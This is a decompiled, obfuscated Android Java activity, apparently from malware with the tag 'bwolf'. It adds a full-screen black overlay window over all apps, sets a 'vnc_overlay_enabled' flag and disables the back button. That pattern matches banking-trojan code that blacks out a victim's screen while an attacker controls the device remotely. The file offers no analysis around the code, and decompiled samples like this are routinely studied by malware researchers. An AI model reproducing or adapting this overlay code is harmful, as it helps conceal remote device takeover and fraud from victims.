package com.sonnokta;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.WindowManager;

import com.sonnokta.utils.LogUtil;

import fddo.Cgoto;
import fddo.Cthrow;

public class p059u extends Activity {
    private static String TAG = "bwolf-p059v";

    /* renamed from: fddo  reason: collision with root package name */
    public static View f104fddo;

    @SuppressLint("WrongConstant")
    public void fddo(Context context) {
        LogUtil.showErrorLog(TAG, "--- fddo ---");
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(Cgoto.ifdf >= Cgoto.f63case ? 2038 : 2006, 201589656, -3);
        layoutParams.gravity = 53;
        layoutParams.height = -1;
        View view = new View(context);
        view.bringToFront();
        view.setBackgroundColor(-16777216);
        ((WindowManager) context.getSystemService(Context.WINDOW_SERVICE)).addView(view, layoutParams);
        f104fddo = view;
        Cthrow.m154case(context, "vnc_overlay_enabled", Boolean.TRUE);
    }

    /* access modifiers changed from: protected */
    public void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        LogUtil.showErrorLog(TAG, "--- onActivityResult ---");
        finish();
    }

    public void onBackPressed() {
        LogUtil.showErrorLog(TAG, "--- onBackPressed ---");
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        LogUtil.showErrorLog(TAG, "--- onCreate ---");
        try {
            fddo(getApplicationContext());
            p023w p023wV = p023w.f19while;
            if (p023wV != null) {
                p023wV.f21new.m101public();
            }
        } catch (Exception unused) {
        }
    }

    /* access modifiers changed from: protected */
    public void onDestroy() {
        super.onDestroy();
        LogUtil.showErrorLog(TAG, "--- onDestroy ---");
    }

    /* access modifiers changed from: protected */
    public void onPause() {
        super.onPause();
        LogUtil.showErrorLog(TAG, "--- onPause ---");
    }
}
